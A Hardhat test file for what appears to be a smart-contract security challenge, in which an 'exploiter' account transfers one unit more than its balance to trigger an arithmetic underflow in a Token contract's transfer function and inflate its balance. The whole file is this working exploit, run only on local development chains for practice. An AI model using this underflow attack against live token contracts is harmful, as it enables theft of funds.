import { ethers, deployments, getNamedAccounts, network } from "hardhat"
import { assert, expect } from "chai"
import { developmentChains } from "../../helper-hardhat-config"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { Token } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Token Exploit", () => {
          let deployer: SignerWithAddress, exploiter: SignerWithAddress
          let tokenContract: Token
          before(async () => {
              const accounts = await ethers.getSigners()

              deployer = accounts[0]
              exploiter = accounts[1]
              await deployments.fixture(["token"])
              tokenContract = await ethers.getContract("Token", deployer)
          })
          // challenge is to increase exploiter balance to a large value > initial balance
          it("Token Exploit Testing", async () => {
              // check if initial balance = 1 ether
              const initialBalance = await tokenContract.balanceOf(exploiter.address)
              expect(initialBalance).equals(
                  ethers.utils.parseEther("1"),
                  "initial balance == 1 ether"
              )

              await tokenContract
                  .connect(exploiter)
                  .transfer(deployer.address, initialBalance.add(1)) // adding 1 more than existing balance

              // adding 1 more than existing balance causes an underflow in arithmetic in transfer function
              // this makes the balance of exploiter infinitely large number
              const newBalance = await tokenContract.balanceOf(exploiter.address)

              expect(newBalance).gt(ethers.utils.parseEther("1000"), "initial balance >1000 ether")
          })
      })
